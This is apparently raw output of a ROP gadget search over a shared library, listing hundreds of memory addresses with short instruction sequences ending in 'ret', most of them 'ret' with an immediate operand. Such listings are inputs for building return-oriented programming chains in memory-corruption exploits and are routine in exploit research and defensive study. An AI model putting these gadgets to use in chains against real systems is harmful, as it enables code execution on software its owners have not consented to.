0x00002aaaaac1c582 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c0a2 : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f73a : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac2006a : rcr dword ptr [rdx], 0xf ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c8c2 : rcr dword ptr [rdx], 0xf ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bbc2 : rcr dword ptr [rdx], 0xf ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1b6e2 : rcr dword ptr [rdx], 0xf ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c3e2 : rcr dword ptr [rdx], 0xf ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f88a : rcr dword ptr [rdx], 0xf ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1f0aa : rcr dword ptr [rdx], 0xf ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab4d188 : rdtsc ; ror byte ptr [rax - 9], cl ; cmc ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac22086 : rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac173f4 : rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaac46f08 : rep stosb byte ptr [rdi], al ; mov rax, rsi ; sub rax, rdx ; vzeroupper ; ret
0x00002aaaaabf8238 : rep stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaab0af9a : rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaaad5937 : ret
0x00002aaaaac6bc45 : ret 0
0x00002aaaaab7bb1a : ret 0x10
0x00002aaaaaad57bf : ret 0x102
0x00002aaaaab41ddf : ret 0x107
0x00002aaaaaae26a1 : ret 0x11
0x00002aaaaab56882 : ret 0x110
0x00002aaaaabbb397 : ret 0x110f
0x00002aaaaab1d40c : ret 0x114d
0x00002aaaaabb521c : ret 0x1175
0x00002aaaaabad406 : ret 0x1176
0x00002aaaaaaf92a8 : ret 0x1189
0x00002aaaaabdbe29 : ret 0x11e8
0x00002aaaaab88104 : ret 0x11eb
0x00002aaaaaadafa9 : ret 0x12
0x00002aaaaab41099 : ret 0x1202
0x00002aaaaaaf48fa : ret 0x1231
0x00002aaaaabd3ddc : ret 0x1274
0x00002aaaaab75a5a : ret 0x13
0x00002aaaaab3004a : ret 0x134b
0x00002aaaaab6d61a : ret 0x1374
0x00002aaaaabebcda : ret 0x1376
0x00002aaaaab26f17 : ret 0x13e8
0x00002aaaaab2f6dc : ret 0x144
0x00002aaaaabf78d9 : ret 0x1472
0x00002aaaaab735b9 : ret 0x147c
0x00002aaaaab1e3f2 : ret 0x148
0x00002aaaaab19099 : ret 0x1480
0x00002aaaaabab37b : ret 0x148b
0x00002aaaaab50fe2 : ret 0x149
0x00002aaaaab157e8 : ret 0x14b8
0x00002aaaaab0c63d : ret 0x14c
0x00002aaaaab7452c : ret 0x14d
0x00002aaaaaba753c : ret 0x14eb
0x00002aaaaab05f90 : ret 0x15
0x00002aaaaab15e3a : ret 0x152c
0x00002aaaaab4e03a : ret 0x157
0x00002aaaaab09c00 : ret 0x1575
0x00002aaaaabc19c1 : ret 0x1589
0x00002aaaaab06d46 : ret 0x15a2
0x00002aaaaaae3460 : ret 0x16
0x00002aaaaabdca97 : ret 0x1674
0x00002aaaaabebb27 : ret 0x1676
0x00002aaaaab6001a : ret 0x17
0x00002aaaaabd1136 : ret 0x1777
0x00002aaaaab74469 : ret 0x180f
0x00002aaaaac0a495 : ret 0x1872
0x00002aaaaab014a6 : ret 0x1874
0x00002aaaaab62fd5 : ret 0x1876
0x00002aaaaaaf3610 : ret 0x18bb
0x00002aaaaaaf0388 : ret 0x18e7
0x00002aaaaab529c5 : ret 0x18eb
0x00002aaaaac77a31 : ret 0x18f
0x00002aaaaab91764 : ret 0x190
0x00002aaaaab2d7ca : ret 0x197
0x00002aaaaab62c75 : ret 0x1974
0x00002aaaaab33c5e : ret 0x1a
0x00002aaaaab7321a : ret 0x1a74
0x00002aaaaab10f12 : ret 0x1a75
0x00002aaaaac59a5a : ret 0x1ad4
0x00002aaaaaba95ba : ret 0x1aeb
0x00002aaaaac581ed : ret 0x1b49
0x00002aaaaabdceb2 : ret 0x1b72
0x00002aaaaab6957a : ret 0x1b8
0x00002aaaaaad6bf5 : ret 0x1bb7
0x00002aaaaab9292b : ret 0x1be
0x00002aaaaab584df : ret 0x1bf
0x00002aaaaaad849f : ret 0x1bf9
0x00002aaaaabd1231 : ret 0x1c77
0x00002aaaaac53650 : ret 0x1d4
0x00002aaaaac53de8 : ret 0x1d5
0x00002aaaaab62b76 : ret 0x1d74
0x00002aaaaaad71d9 : ret 0x1dd4
0x00002aaaaab0179d : ret 0x1de8
0x00002aaaaab94a54 : ret 0x1e74
0x00002aaaaaaf9c2b : ret 0x1e76
0x00002aaaaaafb8e2 : ret 0x1f0f
0x00002aaaaab80bc3 : ret 0x1f74
0x00002aaaaab5917e : ret 0x1f76
0x00002aaaaab96804 : ret 0x1fbd
0x00002aaaaab02952 : ret 0x200
0x00002aaaaab85b05 : ret 0x2041
0x00002aaaaab5ddfd : ret 0x2074
0x00002aaaaabaa1a9 : ret 0x20be
0x00002aaaaab31b3b : ret 0x21
0x00002aaaaab09778 : ret 0x2148
0x00002aaaaabc9f19 : ret 0x21e8
0x00002aaaaab5dd8b : ret 0x2275
0x00002aaaaab7ec97 : ret 0x2276
0x00002aaaaab5deb8 : ret 0x2288
0x00002aaaaaad8ff0 : ret 0x23
0x00002aaaaac43e02 : ret 0x2373
0x00002aaaaab0b8a2 : ret 0x237f
0x00002aaaaaad75e7 : ret 0x23cb
0x00002aaaaac52658 : ret 0x24
0x00002aaaaaad77d8 : ret 0x244f
0x00002aaaaaba40fc : ret 0x2476
0x00002aaaaab4fa6e : ret 0x2501
0x00002aaaaab73098 : ret 0x2574
0x00002aaaaab586ad : ret 0x2575
0x00002aaaaaaf8dc8 : ret 0x2576
0x00002aaaaaadaec8 : ret 0x26
0x00002aaaaab5fe56 : ret 0x2774
0x00002aaaaabd1413 : ret 0x27e8
0x00002aaaaac116d4 : ret 0x28
0x00002aaaaaad554f : ret 0x2800
0x00002aaaaab75bf5 : ret 0x280f
0x00002aaaaabfbc60 : ret 0x2875
0x00002aaaaaaf9273 : ret 0x2876
0x00002aaaaab9465a : ret 0x28f5
0x00002aaaaabfbc28 : ret 0x29
0x00002aaaaac0b58a : ret 0x2919
0x00002aaaaab87401 : ret 0x2941
0x00002aaaaab2a6a3 : ret 0x2944
0x00002aaaaab1c468 : ret 0x2948
0x00002aaaaab84c0a : ret 0x2949
0x00002aaaaab6f71f : ret 0x294c
0x00002aaaaab4dcdf : ret 0x294d
0x00002aaaaab1db64 : ret 0x2973
0x00002aaaaab7f394 : ret 0x2975
0x00002aaaaab4c9aa : ret 0x2976
0x00002aaaaabbed84 : ret 0x2977
0x00002aaaaab35591 : ret 0x29e9
0x00002aaaaabf0143 : ret 0x2a
0x00002aaaaabfcd9a : ret 0x2a09
0x00002aaaaaad6b19 : ret 0x2a63
0x00002aaaaab5908b : ret 0x2a75
0x00002aaaaabeec79 : ret 0x2aea
0x00002aaaaabdbb84 : ret 0x2b
0x00002aaaaab1b198 : ret 0x2b48
0x00002aaaaaaf822e : ret 0x2b49
0x00002aaaaabf5712 : ret 0x2b74
0x00002aaaaab3fd97 : ret 0x2b76
0x00002aaaaab7eff2 : ret 0x2b77
0x00002aaaaac03c9b : ret 0x2b8
0x00002aaaaabe0572 : ret 0x2bb0
0x00002aaaaabcbbac : ret 0x2c
0x00002aaaaabfbc59 : ret 0x2c3c
0x00002aaaaab562ec : ret 0x2c75
0x00002aaaaabd269a : ret 0x2c88
0x00002aaaaab09df9 : ret 0x2e0f
0x00002aaaaac03dd5 : ret 0x2e66
0x00002aaaaabd3d7c : ret 0x2f3c
0x00002aaaaab5cb2e : ret 0x2f74
0x00002aaaaabb71ea : ret 0x2fe9
0x00002aaaaaae5e90 : ret 0x30
0x00002aaaaab0fca8 : ret 0x3039
0x00002aaaaaad6b88 : ret 0x306a
0x00002aaaaab91e96 : ret 0x308b
0x00002aaaaab91dfa : ret 0x308c
0x00002aaaaab56f1c : ret 0x30be
0x00002aaaaab36cda : ret 0x30e8
0x00002aaaaabb642b : ret 0x30f
0x00002aaaaaae27b8 : ret 0x31
0x00002aaaaaaf810d : ret 0x3101
0x00002aaaaabfafe2 : ret 0x3108
0x00002aaaaab1cfd9 : ret 0x3145
0x00002aaaaac03d68 : ret 0x314c
0x00002aaaaab8103a : ret 0x3151
0x00002aaaaab05389 : ret 0x31e8
0x00002aaaaab5bb0c : ret 0x33
0x00002aaaaabcb152 : ret 0x3375
0x00002aaaaabc445d : ret 0x33eb
0x00002aaaaab51475 : ret 0x34
0x00002aaaaab73599 : ret 0x347c
0x00002aaaaab060a5 : ret 0x348
0x00002aaaaaafe44d : ret 0x349
0x00002aaaaab3b2ba : ret 0x34c
0x00002aaaaab4271a : ret 0x3549
0x00002aaaaab5cb38 : ret 0x3574
0x00002aaaaabcb0f0 : ret 0x3575
0x00002aaaaab10f68 : ret 0x357e
0x00002aaaaab3ddb2 : ret 0x35a0
0x00002aaaaabadca5 : ret 0x35e8
0x00002aaaaab2bc42 : ret 0x36
0x00002aaaaabbc2a1 : ret 0x3673
0x00002aaaaac33bca : ret 0x36b
0x00002aaaaab1b4a1 : ret 0x37
0x00002aaaaab29e2a : ret 0x3708
0x00002aaaaaba0703 : ret 0x37e8
0x00002aaaaab0bb7a : ret 0x38
0x00002aaaaac5933a : ret 0x3827
0x00002aaaaab9014e : ret 0x3840
0x00002aaaaab4871f : ret 0x3841
0x00002aaaaabd72bf : ret 0x3845
0x00002aaaaab0f73a : ret 0x386a
0x00002aaaaac13825 : ret 0x3875
0x00002aaaaab62fb5 : ret 0x3876
0x00002aaaaab5052b : ret 0x389
0x00002aaaaac579c6 : ret 0x38ae
0x00002aaaaab43516 : ret 0x38b
0x00002aaaaab33d1d : ret 0x38e9
0x00002aaaaab3b3be : ret 0x3901
0x00002aaaaabadfb8 : ret 0x3902
0x00002aaaaabf6a5b : ret 0x3904
0x00002aaaaab72fb6 : ret 0x3941
0x00002aaaaabb8ba7 : ret 0x3944
0x00002aaaaabb2217 : ret 0x3945
0x00002aaaaab0c381 : ret 0x3948
0x00002aaaaaafc72a : ret 0x3949
0x00002aaaaaaff296 : ret 0x394c
0x00002aaaaab0913d : ret 0x394d
0x00002aaaaab050fa : ret 0x3985
0x00002aaaaab287c2 : ret 0x39e9
0x00002aaaaac08c4a : ret 0x3a
0x00002aaaaab7e5a2 : ret 0x3a01
0x00002aaaaaaf8016 : ret 0x3a18
0x00002aaaaac43deb : ret 0x3a73
0x00002aaaaabb83e0 : ret 0x3ae9
0x00002aaaaaba7631 : ret 0x3b01
0x00002aaaaabb0187 : ret 0x3b42
0x00002aaaaabb01d7 : ret 0x3b43
0x00002aaaaac11b43 : ret 0x3b48
0x00002aaaaac09172 : ret 0x3b74
0x00002aaaaab93c65 : ret 0x3b8
0x00002aaaaab90afa : ret 0x3bba
0x00002aaaaabe4a14 : ret 0x3bf
0x00002aaaaaba46de : ret 0x3c01
0x00002aaaaab5dd71 : ret 0x3c75
0x00002aaaaabc58bf : ret 0x3c76
0x00002aaaaab0e53e : ret 0x3ce8
0x00002aaaaabac666 : ret 0x3d01
0x00002aaaaab09840 : ret 0x3d75
0x00002aaaaab17180 : ret 0x3d7e
0x00002aaaaabe1396 : ret 0x3d83
0x00002aaaaab1bef7 : ret 0x3dbe
0x00002aaaaab93712 : ret 0x3e9
0x00002aaaaab45efb : ret 0x3f7
0x00002aaaaabc9779 : ret 0x3f76
0x00002aaaaabad69a : ret 0x4001
0x00002aaaaabc0535 : ret 0x4002
0x00002aaaaab54142 : ret 0x4007
0x00002aaaaaad59f5 : ret 0x4021
0x00002aaaaab2899b : ret 0x4050
0x00002aaaaab81009 : ret 0x408d
0x00002aaaaaaf7d30 : ret 0x4101
0x00002aaaaab8c9e5 : ret 0x4102
0x00002aaaaabb2752 : ret 0x4104
0x00002aaaaab226a9 : ret 0x4108
0x00002aaaaab2420c : ret 0x4110
0x00002aaaaab5718c : ret 0x4117
0x00002aaaaabc25f8 : ret 0x4118
0x00002aaaaab73263 : ret 0x4153
0x00002aaaaac00bc3 : ret 0x415f
0x00002aaaaabcc1c5 : ret 0x4164
0x00002aaaaaaf8b8e : ret 0x41c3
0x00002aaaaab6f767 : ret 0x4201
0x00002aaaaac022a5 : ret 0x4203
0x00002aaaaab90a44 : ret 0x4240
0x00002aaaaab73baa : ret 0x4266
0x00002aaaaabaefb6 : ret 0x428b
0x00002aaaaab9186c : ret 0x428d
0x00002aaaaab011b8 : ret 0x42e8
0x00002aaaaab6edca : ret 0x4301
0x00002aaaaaaff853 : ret 0x4389
0x00002aaaaab49d83 : ret 0x4401
0x00002aaaaabb5c15 : ret 0x4404
0x00002aaaaab96ca4 : ret 0x4407
0x00002aaaaaba1245 : ret 0x4408
0x00002aaaaaad5888 : ret 0x440c
0x00002aaaaab22c71 : ret 0x440f
0x00002aaaaab47857 : ret 0x4410
0x00002aaaaaad5456 : ret 0x4412
0x00002aaaaabad1f4 : ret 0x4422
0x00002aaaaabe39a6 : ret 0x4428
0x00002aaaaabe77d8 : ret 0x4430
0x00002aaaaabb5c46 : ret 0x4489
0x00002aaaaab09ea0 : ret 0x448b
0x00002aaaaab11e72 : ret 0x44c6
0x00002aaaaabba1c2 : ret 0x44c7
0x00002aaaaab323da : ret 0x45
0x00002aaaaabb80fb : ret 0x4501
0x00002aaaaab41712 : ret 0x4502
0x00002aaaaab3b2db : ret 0x4504
0x00002aaaaabebfa7 : ret 0x4510
0x00002aaaaab8c9be : ret 0x4574
0x00002aaaaab0bb2e : ret 0x4577
0x00002aaaaabb474f : ret 0x45c6
0x00002aaaaabf412b : ret 0x45e9
0x00002aaaaab43678 : ret 0x45f6
0x00002aaaaab7f377 : ret 0x4675
0x00002aaaaaafed97 : ret 0x4676
0x00002aaaaabe7616 : ret 0x46e9
0x00002aaaaab8c957 : ret 0x4703
0x00002aaaaab6efaf : ret 0x470e
0x00002aaaaab73014 : ret 0x474
0x00002aaaaac584c4 : ret 0x474c
0x00002aaaaaafa6f6 : ret 0x4801
0x00002aaaaab68d61 : ret 0x4802
0x00002aaaaab43681 : ret 0x4803
0x00002aaaaaafb56d : ret 0x4804
0x00002aaaaab68e0d : ret 0x4805
0x00002aaaaab68df5 : ret 0x4806
0x00002aaaaabdce9b : ret 0x4807
0x00002aaaaabfb3bf : ret 0x4808
0x00002aaaaab014b4 : ret 0x4809
0x00002aaaaabdf5e2 : ret 0x480a
0x00002aaaaabdf1e2 : ret 0x480b
0x00002aaaaab8faf2 : ret 0x480e
0x00002aaaaab26184 : ret 0x480f
0x00002aaaaab1dd94 : ret 0x4810
0x00002aaaaaaf491e : ret 0x4811
0x00002aaaaac0ba71 : ret 0x4812
0x00002aaaaabdd38d : ret 0x4814
0x00002aaaaab20632 : ret 0x481e
0x00002aaaaab20652 : ret 0x4820
0x00002aaaaab2932c : ret 0x482d
0x00002aaaaabfa04e : ret 0x482e
0x00002aaaaaaf646f : ret 0x4830
0x00002aaaaab3b165 : ret 0x4840
0x00002aaaaaba08bc : ret 0x4864
0x00002aaaaabe9add : ret 0x4874
0x00002aaaaabebbd5 : ret 0x4875
0x00002aaaaabe5308 : ret 0x48b
0x00002aaaaac07fe4 : ret 0x48bf
0x00002aaaaab5fba8 : ret 0x48c3
0x00002aaaaab0fba0 : ret 0x48d
0x00002aaaaac59c86 : ret 0x48f
0x00002aaaaaaf7cfa : ret 0x4901
0x00002aaaaab0937c : ret 0x4903
0x00002aaaaaafe019 : ret 0x4904
0x00002aaaaaafb48c : ret 0x4906
0x00002aaaaab248a9 : ret 0x4908
0x00002aaaaab937a9 : ret 0x4909
0x00002aaaaac03ef0 : ret 0x4910
0x00002aaaaab5b7ee : ret 0x4920
0x00002aaaaab5a738 : ret 0x4930
0x00002aaaaab9bca9 : ret 0x4948
0x00002aaaaaad88f3 : ret 0x49ec
0x00002aaaaabbf100 : ret 0x4a08
0x00002aaaaab570a5 : ret 0x4a74
0x00002aaaaab483b0 : ret 0x4ae8
0x00002aaaaab8ce80 : ret 0x4ae9
0x00002aaaaab07d55 : ret 0x4c01
0x00002aaaaab68fd1 : ret 0x4c02
0x00002aaaaabac062 : ret 0x4c04
0x00002aaaaab289a6 : ret 0x4c05
0x00002aaaaab36c84 : ret 0x4c08
0x00002aaaaabaccab : ret 0x4c20
0x00002aaaaab1fcf6 : ret 0x4c40
0x00002aaaaabadd58 : ret 0x4c6
0x00002aaaaab94c15 : ret 0x4c80
0x00002aaaaab28400 : ret 0x4c8b
0x00002aaaaab165b5 : ret 0x4d01
0x00002aaaaaaf8ca1 : ret 0x4d02
0x00002aaaaab7a4b2 : ret 0x4d10
0x00002aaaaabe4542 : ret 0x4d30
0x00002aaaaaaf7800 : ret 0x4d74
0x00002aaaaac596e7 : ret 0x4e27
0x00002aaaaab4a5d0 : ret 0x4e8b
0x00002aaaaab92fb9 : ret 0x4eb
0x00002aaaaaaf6938 : ret 0x4ee9
0x00002aaaaaae0328 : ret 0x4f
0x00002aaaaaafed8e : ret 0x4f72
0x00002aaaaab0b9d4 : ret 0x4f77
0x00002aaaaac908a9 : ret 0x503
0x00002aaaaababe95 : ret 0x5089
0x00002aaaaac43dd4 : ret 0x5173
0x00002aaaaabc038a : ret 0x51e
0x00002aaaaabd19e9 : ret 0x51e8
0x00002aaaaab012b3 : ret 0x527e
0x00002aaaaaad818e : ret 0x52c0
0x00002aaaaaadd658 : ret 0x53
0x00002aaaaac0da1a : ret 0x535
0x00002aaaaab42008 : ret 0x5389
0x00002aaaaac02cfb : ret 0x53ff
0x00002aaaaabc20bc : ret 0x5408
0x00002aaaaab9021b : ret 0x5438
0x00002aaaaab73579 : ret 0x547c
0x00002aaaaab1f1f6 : ret 0x5488
0x00002aaaaaaff11a : ret 0x5489
0x00002aaaaac5794c : ret 0x5508
0x00002aaaaab0795f : ret 0x5525
0x00002aaaaaad745e : ret 0x5576
0x00002aaaaabab34a : ret 0x5589
0x00002aaaaaae0538 : ret 0x56
0x00002aaaaab5dd57 : ret 0x5675
0x00002aaaaabf1c12 : ret 0x56e9
0x00002aaaaab921fa : ret 0x572
0x00002aaaaab5bc52 : ret 0x575
0x00002aaaaabeb9e2 : ret 0x577
0x00002aaaaabd5be3 : ret 0x57e8
0x00002aaaaaba3ce3 : ret 0x57e9
0x00002aaaaac59c18 : ret 0x5803
0x00002aaaaab0e6fb : ret 0x589
0x00002aaaaab3ffe2 : ret 0x58e8
0x00002aaaaac57620 : ret 0x591c
0x00002aaaaab8628a : ret 0x594
0x00002aaaaabad491 : ret 0x5974
0x00002aaaaabf4073 : ret 0x5978
0x00002aaaaaad8269 : ret 0x5a51
0x00002aaaaabf8343 : ret 0x5a74
0x00002aaaaac58387 : ret 0x5ae4
0x00002aaaaabbbee9 : ret 0x5ba
0x00002aaaaaad7f9f : ret 0x5bdb
0x00002aaaaabe5ab0 : ret 0x5bf
0x00002aaaaaafbd01 : ret 0x5c77
0x00002aaaaaad8055 : ret 0x5cbe
0x00002aaaaab8a5ce : ret 0x5ce8
0x00002aaaaac0291a : ret 0x5e6
0x00002aaaaabbe10d : ret 0x5ee9
0x00002aaaaaad54b9 : ret 0x6080
0x00002aaaaaad7725 : ret 0x617e
0x00002aaaaac5a0b2 : ret 0x62c1
0x00002aaaaab29d53 : ret 0x6348
0x00002aaaaab4c662 : ret 0x6349
0x00002aaaaabad3c0 : ret 0x634d
0x00002aaaaab7f35a : ret 0x6375
0x00002aaaaab61d2f : ret 0x63be
0x00002aaaaabfac7a : ret 0x646
0x00002aaaaab73569 : ret 0x647c
0x00002aaaaac052c9 : ret 0x6600
0x00002aaaaabbd64a : ret 0x6601
0x00002aaaaab12251 : ret 0x6610
0x00002aaaaab62f42 : ret 0x6620
0x00002aaaaaad7827 : ret 0x6642
0x00002aaaaab5fbf5 : ret 0x66c3
0x00002aaaaabcda26 : ret 0x674
0x00002aaaaac5763f : ret 0x67b2
0x00002aaaaabdc4d3 : ret 0x67e8
0x00002aaaaab90a41 : ret 0x6948
0x00002aaaaabc8639 : ret 0x69e9
0x00002aaaaabdacea : ret 0x69f
0x00002aaaaabed0fd : ret 0x6ae9
0x00002aaaaab96cff : ret 0x6b45
0x00002aaaaaba25df : ret 0x6b8
0x00002aaaaaad8ce2 : ret 0x6bba
0x00002aaaaabe41a2 : ret 0x6bf
0x00002aaaaab80b21 : ret 0x6c74
0x00002aaaaaaf66fa : ret 0x6d7
0x00002aaaaac68733 : ret 0x6e1f
0x00002aaaaabf2b1a : ret 0x6e4
0x00002aaaaac5a241 : ret 0x6f9
0x00002aaaaab04ace : ret 0x6fe9
0x00002aaaaabed9de : ret 0x708d
0x00002aaaaabdcfc9 : ret 0x71e8
0x00002aaaaabe8cd8 : ret 0x71e9
0x00002aaaaaaf64fa : ret 0x723
0x00002aaaaac2211e : ret 0x7280
0x00002aaaaab50a51 : ret 0x7401
0x00002aaaaab59283 : ret 0x7402
0x00002aaaaab565d5 : ret 0x7404
0x00002aaaaab47b69 : ret 0x7408
0x00002aaaaab42ba1 : ret 0x7420
0x00002aaaaab26562 : ret 0x7450
0x00002aaaaab9a435 : ret 0x748d
0x00002aaaaab7ee4f : ret 0x74e9
0x00002aaaaab756e7 : ret 0x7501
0x00002aaaaab756ec : ret 0x7502
0x00002aaaaab36ba6 : ret 0x7504
0x00002aaaaab47b11 : ret 0x7508
0x00002aaaaac44d5b : ret 0x7510
0x00002aaaaab63744 : ret 0x7518
0x00002aaaaac44d68 : ret 0x7520
0x00002aaaaabad288 : ret 0x7540
0x00002aaaaabaaa67 : ret 0x7580
0x00002aaaaabb6105 : ret 0x75e8
0x00002aaaaac42cc2 : ret 0x7677
0x00002aaaaaaf8222 : ret 0x774
0x00002aaaaab1d78a : ret 0x777
0x00002aaaaabdc3c3 : ret 0x77e8
0x00002aaaaabf1bf1 : ret 0x77e9
0x00002aaaaabe5e0a : ret 0x793
0x00002aaaaaad7eec : ret 0x793b
0x00002aaaaaba1ed9 : ret 0x7974
0x00002aaaaabf3b1c : ret 0x7a8d
0x00002aaaaab875b0 : ret 0x7ae8
0x00002aaaaaaf8dfa : ret 0x7b8
0x00002aaaaab09d85 : ret 0x7c7
0x00002aaaaab62ed2 : ret 0x7e20
0x00002aaaaabcbd33 : ret 0x7e8
0x00002aaaaab5e33c : ret 0x7f10
0x00002aaaaab2e904 : ret 0x7f3c
0x00002aaaaac2d44e : ret 0x80
0x00002aaaaab5f519 : ret 0x8000
0x00002aaaaab093bc : ret 0x8001
0x00002aaaaab939a2 : ret 0x8010
0x00002aaaaaba40a9 : ret 0x8040
0x00002aaaaabb53cf : ret 0x8041
0x00002aaaaab7a8ed : ret 0x8072
0x00002aaaaabf25c6 : ret 0x8080
0x00002aaaaaad88b0 : ret 0x80fc
0x00002aaaaabac2fd : ret 0x8141
0x00002aaaaab1ad16 : ret 0x8148
0x00002aaaaab0a08f : ret 0x8166
0x00002aaaaabc9eb9 : ret 0x81e8
0x00002aaaaabb5ad9 : ret 0x820f
0x00002aaaaac00016 : ret 0x828d
0x00002aaaaab55ebf : ret 0x82e9
0x00002aaaaab4bcd1 : ret 0x82eb
0x00002aaaaab06275 : ret 0x8301
0x00002aaaaac053fe : ret 0x8302
0x00002aaaaabf6019 : ret 0x8303
0x00002aaaaabad16a : ret 0x8304
0x00002aaaaab6df05 : ret 0x8305
0x00002aaaaab6defd : ret 0x8306
0x00002aaaaab330cb : ret 0x8308
0x00002aaaaab2ac34 : ret 0x830f
0x00002aaaaac04122 : ret 0x8320
0x00002aaaaabb357f : ret 0x833b
0x00002aaaaab1bdaa : ret 0x8341
0x00002aaaaab0f61d : ret 0x8348
0x00002aaaaab126e4 : ret 0x8349
0x00002aaaaab44353 : ret 0x8389
0x00002aaaaab84fa7 : ret 0x83e8
0x00002aaaaab49cf0 : ret 0x840
0x00002aaaaaba2fde : ret 0x8401
0x00002aaaaabe2278 : ret 0x8408
0x00002aaaaaaf506c : ret 0x840f
0x00002aaaaabbd5dd : ret 0x844
0x00002aaaaab6bbf8 : ret 0x8440
0x00002aaaaab7edb6 : ret 0x8444
0x00002aaaaab6b827 : ret 0x8445
0x00002aaaaabb4b40 : ret 0x8488
0x00002aaaaab29d45 : ret 0x8504
0x00002aaaaab41e96 : ret 0x8508
0x00002aaaaaaf691c : ret 0x850f
0x00002aaaaab1a6b1 : ret 0x8539
0x00002aaaaabc5fbd : ret 0x8545
0x00002aaaaaaf5130 : ret 0x8548
0x00002aaaaab012c5 : ret 0x854d
0x00002aaaaabbf728 : ret 0x8589
0x00002aaaaab272bc : ret 0x858b
0x00002aaaaab23a24 : ret 0x85c7
0x00002aaaaaaf90f0 : ret 0x860f
0x00002aaaaab0a5b6 : ret 0x870f
0x00002aaaaac56f5e : ret 0x871e
0x00002aaaaab126d7 : ret 0x875
0x00002aaaaab62fe5 : ret 0x876
0x00002aaaaab11e6d : ret 0x87e
0x00002aaaaabd13b3 : ret 0x87e8
0x00002aaaaab00c4a : ret 0x87e9
0x00002aaaaab5d7da : ret 0x8801
0x00002aaaaab73e32 : ret 0x8802
0x00002aaaaaaf9e31 : ret 0x8804
0x00002aaaaab2c621 : ret 0x880f
0x00002aaaaaafa949 : ret 0x8840
0x00002aaaaaad75b4 : ret 0x88ad
0x00002aaaaaaf9202 : ret 0x8901
0x00002aaaaab3189b : ret 0x8908
0x00002aaaaabde845 : ret 0x8940
0x00002aaaaab20161 : ret 0x8941
0x00002aaaaab8dbd5 : ret 0x8942
0x00002aaaaab4bb9c : ret 0x8944
0x00002aaaaab25ebe : ret 0x8945
0x00002aaaaab8dff6 : ret 0x8946
0x00002aaaaaafbdc1 : ret 0x8948
0x00002aaaaaaf9ffe : ret 0x8949
0x00002aaaaab05cca : ret 0x894c
0x00002aaaaaaf7d0f : ret 0x894d
0x00002aaaaab1e0ab : ret 0x894e
0x00002aaaaab10360 : ret 0x8966
0x00002aaaaab62b4a : ret 0x8a04
0x00002aaaaaad7553 : ret 0x8a4c
0x00002aaaaab3a62f : ret 0x8ae9
0x00002aaaaab41962 : ret 0x8b04
0x00002aaaaab02a3e : ret 0x8b05
0x00002aaaaabaccc0 : ret 0x8b10
0x00002aaaaac5978e : ret 0x8b36
0x00002aaaaab0153a : ret 0x8b41
0x00002aaaaabc4c43 : ret 0x8b44
0x00002aaaaabab4c0 : ret 0x8b47
0x00002aaaaab0ad75 : ret 0x8b48
0x00002aaaaab494d6 : ret 0x8b49
0x00002aaaaab1e02e : ret 0x8b4a
0x00002aaaaaaff27d : ret 0x8b4c
0x00002aaaaab43418 : ret 0x8b64
0x00002aaaaab8212c : ret 0x8b8
0x00002aaaaab95e98 : ret 0x8c0f
0x00002aaaaaad87b6 : ret 0x8cba
0x00002aaaaab30d95 : ret 0x8d01
0x00002aaaaab1fc1d : ret 0x8d04
0x00002aaaaab26fef : ret 0x8d0f
0x00002aaaaab98651 : ret 0x8d41
0x00002aaaaabed8ff : ret 0x8d44
0x00002aaaaabed950 : ret 0x8d45
0x00002aaaaaaf5778 : ret 0x8d48
0x00002aaaaab05319 : ret 0x8d49
0x00002aaaaab1d529 : ret 0x8d4a
0x00002aaaaab1d3c5 : ret 0x8d4c
0x00002aaaaab77742 : ret 0x8d4d
0x00002aaaaab571ec : ret 0x8d4e
0x00002aaaaac132ab : ret 0x8d8b
0x00002aaaaaafd54c : ret 0x8e0f
0x00002aaaaabd0a11 : ret 0x8e75
0x00002aaaaab8594d : ret 0x8eb
0x00002aaaaabe2cac : ret 0x8ee8
0x00002aaaaabb4be9 : ret 0x8f0f
0x00002aaaaab461f8 : ret 0x8feb
0x00002aaaaac73d48 : ret 0x900e
0x00002aaaaabac12d : ret 0x9066
0x00002aaaaab0290d : ret 0x90c3
0x00002aaaaac14705 : ret 0x90f3
0x00002aaaaab4d0ec : ret 0x91eb
0x00002aaaaab27008 : ret 0x92e8
0x00002aaaaabeda05 : ret 0x930f
0x00002aaaaab5be8e : ret 0x93be
0x00002aaaaabfb153 : ret 0x93c
0x00002aaaaab36b92 : ret 0x940f
0x00002aaaaab12ad7 : ret 0x941
0x00002aaaaab54efa : ret 0x945
0x00002aaaaabaf4ff : ret 0x947c
0x00002aaaaac03f37 : ret 0x948
0x00002aaaaab61a18 : ret 0x94c
0x00002aaaaabb101a : ret 0x94d
0x00002aaaaab21391 : ret 0x9522
0x00002aaaaabe8a69 : ret 0x952b
0x00002aaaaab05b18 : ret 0x953d
0x00002aaaaac585b3 : ret 0x9576
0x00002aaaaab46389 : ret 0x95eb
0x00002aaaaabccf3f : ret 0x970f
0x00002aaaaaad8798 : ret 0x975
0x00002aaaaab55ed9 : ret 0x976
0x00002aaaaabcb6a3 : ret 0x97e8
0x00002aaaaabb837c : ret 0x9848
